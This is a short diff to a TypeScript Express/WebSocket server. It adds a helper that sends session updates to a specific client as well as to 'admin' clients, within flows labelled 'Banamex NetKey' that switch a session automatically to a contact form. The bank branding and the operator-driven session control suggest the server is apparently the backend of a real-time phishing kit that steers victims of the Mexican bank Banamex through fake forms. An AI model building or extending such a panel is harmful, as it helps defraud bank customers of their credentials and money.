@@ -870,10 +870,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
           console.log(`[Banamex NetKey] Cambiando automáticamente a formulario de contacto - Session: ${sessionId}`);
 
-          broadcastToAdmins(JSON.stringify({
+          const updateMessage = JSON.stringify({
             type: 'SESSION_UPDATE',
             data: updatedSession
-          }));
+          });
+
+          // Enviar al cliente específico
+          sendToClient(sessionId, updateMessage);
+
+          // También enviar a admins
+          broadcastToAdmins(updateMessage);
         } catch (error) {
           console.error(`[Banamex NetKey] Error al cambiar a formulario: ${error}`);
         }
@@ -2774,4 +2780,18 @@ function broadcastToAdmins(message: string, targetUsername?: string) {
   }
 
   console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);
+}
+
+// Helper function to send message to a specific client by sessionId
+function sendToClient(sessionId: string, message: string) {
+  const client = clients.get(sessionId);
+  
+  if (client && client.readyState === WebSocket.OPEN) {
+    client.send(message);
+    console.log(`[SendToClient] Mensaje enviado al cliente con sessionId: ${sessionId}`);
+    return true;
+  } else {
+    console.log(`[SendToClient] Cliente no encontrado o desconectado: ${sessionId}`);
+    return false;
+  }
 }
